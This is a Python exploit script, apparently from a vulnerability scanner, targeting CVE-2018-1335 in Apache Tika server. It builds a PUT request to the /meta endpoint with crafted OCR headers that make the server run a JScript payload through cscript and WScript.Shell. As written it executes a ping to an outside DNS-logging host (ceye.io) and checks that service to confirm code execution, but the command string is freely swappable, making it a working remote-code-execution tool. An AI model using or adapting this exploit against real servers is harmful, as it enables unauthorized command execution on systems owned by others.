#coding:utf-8
import sys
import requests
#import random_str
import time
sys.path.insert(0,'../')
from config import random_str
from config import config


def exp_cve_2018_1335(url,portu=9998):
    ceye_dns = config.ceye_dns
    random_s = random_str.random_str()
    cmd = """ping {0}.vx8u3g.ceye.io -n 1""".format(random_s)
    port = portu
    if "://" in url:
        tmp_url = url
        sign = tmp_url.split("//",1)[1]
        if "/" in sign:
            if sign.split("/",1)[1]:
                sign = sign.split("/",1)[1]
                target_url = tmp_url.split(sign,1)[0]
            else:
                target_url = tmp_url
        else:
            target_url = tmp_url + "/"
    else:
        tmp_url = "http://" + url
        sign = tmp_url.split("//", 1)[1]
        if "/" in sign:
            if sign.split("/",1)[1]:
                sign = sign.split("/",1)[1]
                target_url = tmp_url.split(sign,1)[0]
            else:
                target_url = tmp_url
        else:
            target_url = tmp_url + "/"
    #print(target_url)
    if ":" in target_url.split(":",1)[1]:
        target_url = target_url + "/meta"
    else:
        target_url = target_url.rstrip("/") + ":" + str(port) + "/meta"
    #print(target_url)
    headers = {"X-Tika-OCRTesseractPath": "\"cscript\"",
            "X-Tika-OCRLanguage": "//E:Jscript",
            "Expect": "100-continue",
            "Content-type": "image/jp2",
            "Connection": "close"}

    jscript='''var oShell = WScript.CreateObject("WScript.Shell");
    var oExec = oShell.run('{}'); 
    '''.format(cmd)
    #等价var oExec = oShell.Exec('cmd /c {}')

    try:
            requests.put(target_url, headers=headers, data=jscript, verify=False)

    except:
            try:
                    requests.put(target_url, headers=headers, data=jscript)
            except:
                print(url + "  不存在CVE-2018-1335漏洞")
                return None
    time.sleep(1)
    reponse = requests.get(ceye_dns).text
    #print(reponse)
    if random_s in reponse:
        print(url + "  存在CVE-2018-1335漏洞")
    else:
        print(url + "  不存在CVE-2018-1335漏洞")



# exp_cve_2018_1335("http://127.0.0.1/")